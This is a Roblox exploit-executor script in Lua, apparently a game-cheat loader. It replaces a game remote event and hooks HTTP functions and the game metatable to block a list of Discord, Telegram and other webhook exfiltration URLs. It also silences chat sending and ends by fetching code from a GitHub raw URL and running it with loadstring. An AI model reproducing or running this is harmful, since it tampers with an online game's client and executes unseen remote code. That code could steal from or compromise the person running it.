rs = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
G = rs.GrabEvents
G:WaitForChild("EndGrabEarly"):Destroy()
Instance.new("RemoteEvent", G).Name = "EndGrabEarly"


local function isBlocked(url)
    if type(url) ~= 'string' then return false end
    local lowerUrl = string.lower(url)
    
    local blockedKeywords = {
        'discord.com/api/webhooks',
        'discordapp.com/api/webhooks',
        'webhook',
        'api.telegram.org',
        'guilded.gg/api/webhooks',
        'hooks.hyra.io',
        'webhook.lewisakura.moe',
        'webhook.pm',
        'https://pastefy.app/Fly7WzB4/raw',
        'https://pastefy.app/8tEZ0bp6/raw'
    }

    for _, v in ipairs(blockedKeywords) do
        if string.find(lowerUrl, string.lower(v), 1, true) then
            return true
        end
    end
    return false
end

local oldHttpGet
oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
    if isBlocked(url) then
        warn('[강제 차단] 위험 URL: ' .. tostring(url))
        return "return {}"
    end
    return oldHttpGet(self, url, ...)
end)

local env = getgenv and getgenv() or _G
local httpFuncs = {
    env.request, 
    env.http_request, 
    (env.http and env.http.request), 
    (env.syn and env.syn.request), 
    (env.fluxus and env.fluxus.request)
}

for _, f in pairs(httpFuncs) do
    if type(f) == 'function' then
        local g
        g = hookfunction(f, function(h, ...)
            local url = (type(h) == 'table' and h.Url) or (type(h) == 'string' and h) or "알수없는URL"
            
            if isBlocked(url) then
                warn('[강제 차단] 위험 URL: ' .. tostring(url))
                return {Success = false, StatusCode = 403, StatusMessage = 'Forbidden', Headers = {}, Body = 'Access Denied'}
            end
            return g(h, ...)
        end)
    end
end

local HttpService = game:GetService('HttpService')
local mt = getrawmetatable(game)
if mt then
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        if self == HttpService and (method == 'PostAsync' or method == 'GetAsync' or method == 'RequestAsync') then
            local url = (type(args[1]) == 'table' and args[1].Url) or (type(args[1]) == 'string' and args[1]) or "알수없는URL"
            
            if isBlocked(url) then
                warn('[강제 차단] 위험 URL: ' .. tostring(url))
                if method == 'PostAsync' or method == 'GetAsync' then
                    return 'return {}' 
                else
                    return {Success = false, StatusCode = 403, StatusMessage = 'Forbidden', Headers = {}, Body = 'Access Denied'}
                end
            end
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end



local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

pcall(function()
    local ev = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if ev then
        local say = ev:FindFirstChild("SayMessageRequest")
        if say and typeof(say.FireServer) == "function" then
            say.FireServer = function() end
        end
    end
end)

task.spawn(function()
    local function try_patch(channel)
        pcall(function()
            if channel and channel.ClassName == "TextChannel" then
                local ok, _ = pcall(function() channel.SendAsync = function() end end)
                if not ok then
                    if hookfunction and typeof(channel.SendAsync) == "function" then
                        pcall(function()
                            local orig = channel.SendAsync
                            pcall(function() hookfunction(orig, function() end) end)
                        end)
                    end
                end
            end
        end)
    end

    local textChannels = TextChatService:FindFirstChild("TextChannels") or TextChatService:WaitForChild("TextChannels", 10)
    if textChannels then
        for _, c in ipairs(textChannels:GetChildren()) do
            try_patch(c)
        end
        textChannels.ChildAdded:Connect(try_patch)
    else
        while not TextChatService:FindFirstChild("TextChannels") do
            task.wait(0.5)
        end
        local tc = TextChatService.TextChannels
        for _, c in ipairs(tc:GetChildren()) do try_patch(c) end
        tc.ChildAdded:Connect(try_patch)
    end
end)

task.delay(0.15, function()
    local ok, res = pcall(function()
        return 
loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/뭐노"))()

end)
    if not ok then
        warn(" loader failed:", res)
    end
end)
